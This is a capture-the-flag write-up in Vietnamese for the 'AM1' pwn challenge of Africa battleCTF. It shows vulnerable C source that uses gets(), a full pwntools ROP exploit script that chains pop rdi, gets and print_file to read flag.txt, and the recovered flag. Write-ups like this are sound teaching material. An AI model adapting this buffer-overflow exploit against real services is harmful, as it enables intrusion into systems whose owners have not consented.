# AM1

**source C:**

```
#include <stdio.h>
#include <stdlib.h>

void print_file(char * file)
{
	char buffer[20];
	FILE * inputFile = fopen( file, "r" );
	if ( inputFile == NULL ) {
        printf( "Cannot open file %s\n", file );
        exit( -1 );
    }
    fgets( buffer, 65, inputFile );
    printf("Output: %s",buffer);
}

int main(){


    puts("Welcome to Africa battleCTF.");
    puts("Tell us something about you: ");
    char buf[0x30];
    gets( buf );

    return 0;
}

```

**checks và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/63af5b7d-74aa-4c58-9469-5dc0383e0411)

hmm bài này có lỗi BOF bình thường và ta dễ dàng ret2win đến hàm print_file

**tại hàm print_file thì nó sẽ đọc 1 file nào đó trong server chưa xác định được, ta thử dùng ret2win chạy thử xem sao**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/864b882b-b645-4e3f-99cd-e90705dbae62)

đến đây thì nó sẽ so sánh **rbp-0x8** với giá trị **null** giống nhau nên sẽ out chương trình

vấn đề bây h là hàm **print_file** ko đọc đúng file mình cần, thứ mình cần là file **flag.txt**, nên hướng làm là ta sẽ gán file **flag.txt** vào hàm print_flag để đọc flag

bây giờ ta cần **pop rdi** và 1 địa chỉ tĩnh ghi được để có thể lợi dùng hàm **gets** để nhập **flag.txt vào pop rdi**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/8179c5eb-0d38-448f-a706-23017d28d5ec)


tại đây địa chi 0x00000000404000 là địa chỉ ghi được, ta sẽ tăng lên là 0x00000000404a00 để chắc chắn ra được

**(chi tiết hướng làm mình sẽ comment trên script)**

**script:**

```

from pwn import *

context.binary = exe = ELF('./am1',checksec=False)

p = process(exe.path)
# p = remote('pwn.battlectf.online',1003)

gdb.attach(p, gdbscript = '''
b*main+55
c
''')

input()

pop_rdi = 0x000000000040128b

payload = b'a'*56 # offset 
payload += p64(pop_rdi) + p64(0x00000000404a00) # gán địa chỉ ghi được vào rdi
payload += p64(exe.sym['gets']) #nhập flag.txt vào địa chỉ ghi được
payload += p64(pop_rdi) + p64(0x00000000404a00) #gán flag.txt vào rdi
payload += p64(exe.sym['print_file']) # chạy vào đây in flag

p.sendline(payload)

sleep(2)

p.sendline(b'flag.txt')


p.interactive()
```

**flag:**

battleCTF{Africa_1d3al_r0p_e70bee3af3e2b1430d8dc7863a33790d}









